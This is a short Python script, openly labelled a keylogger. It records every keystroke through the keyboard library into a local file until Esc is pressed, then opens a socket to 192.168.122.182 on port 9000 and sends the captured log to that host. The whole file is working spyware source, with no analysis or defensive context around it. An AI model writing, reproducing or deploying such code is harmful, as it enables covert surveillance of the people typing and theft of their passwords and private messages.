import keyboard
import socket
import os

log_file = 'keylogs.txt'
server_ip = '192.168.122.182'
port = 9000

def main():
    print('Starting keylogger...')
    
    while True:
        events = keyboard.read_event()
        
        if events.name == 'esc':
            break
            
        with open(log_file, 'a') as f:
            f.write(str(events.name))
            print('Key logged:', str(events.name))
    
    send_logs()

def send_logs():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((server_ip, port))
            
            with open(log_file, 'rb') as f:
                data = f.read()
                s.sendall(data)
                
            print('Logs sent successfully!')
        except Exception as e:
            print('Error sending logs:', str(e))

if __name__ == '__main__':
    main()